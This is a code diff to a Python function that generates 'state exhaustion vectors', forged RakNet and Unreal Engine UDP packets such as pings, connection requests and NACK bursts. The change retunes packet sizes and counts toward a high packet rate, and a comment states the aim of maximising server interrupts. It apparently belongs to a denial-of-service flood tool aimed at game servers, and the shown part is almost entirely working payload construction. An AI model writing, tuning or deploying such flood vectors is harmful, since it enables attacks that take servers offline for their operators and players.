@@ -153,36 +153,23 @@ RAKNET_MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x7
 
 def generate_state_exhaustion_vectors() -> list:
     vectors = []
-    # 1. RakNet Unconnected Ping Vector
-    for i in range(10):
+    # High-PPS Header Vectors (40-128 bytes - Maximizes Server Interrupts/Sec)
+    for _ in range(25):
         t_stamp = os.urandom(8)
         guid = os.urandom(8)
-        vectors.append(b"\x01" + t_stamp + RAKNET_MAGIC + guid)
+        vectors.append(b"\x01" + t_stamp + RAKNET_MAGIC + guid)  # RakNet Ping (33 bytes)
 
-    # 2. RakNet Open Connection Request 1 (MTU Allocation)
-    for mtu_size in [1200, 1350, 1400]:
-        padding = b"\x00" * (mtu_size - 18)
-        vectors.append(b"\x05" + RAKNET_MAGIC + b"\x0b" + padding)
+    for _ in range(15):
+        vectors.append(b"\x05" + RAKNET_MAGIC + b"\x0b" + os.urandom(64))  # Open Connection 1
 
-    # 3. RakNet Open Connection Request 2 (Session Cookie)
-    for _ in range(5):
-        vectors.append(b"\x07" + RAKNET_MAGIC + b"\x04\x00\x00\x00" + os.urandom(100))
+    for _ in range(15):
+        vectors.append(b"\x07" + RAKNET_MAGIC + b"\x04\x00\x00\x00" + os.urandom(32))  # Open Connection 2
 
-    # 4. Unreal NetDriver NACK Control Vector
-    for _ in range(5):
-        vectors.append(b"\x03\x00\x00\x00" + os.urandom(1200))
+    for _ in range(15):
+        vectors.append(b"\x03\x00\x00\x00" + os.urandom(64))  # Unreal NACK Burst
 
-    # 5. Unreal Engine Connection Handshake Challenge
-    for _ in range(5):
-        vectors.append(b"\x00\x00\x00\x00\x01\x00\x00\x00\x01" + os.urandom(800))
-
-    # 6. RakNet ACK Range Exhaustion
-    for _ in range(5):
-        vectors.append(b"\xc0\x00\x01\x00\x00" + os.urandom(500))
-
-    # 7. Heavy MTU Max Saturation Streams
     for _ in range(10):
-        vectors.append(b"\xff\xff\xff\xff\x55\x53" + os.urandom(1380))
+        vectors.append(b"\xff\xff\xff\xff\x55\x53" + os.urandom(512))  # Mid MTU Saturation
 
     return vectors
 
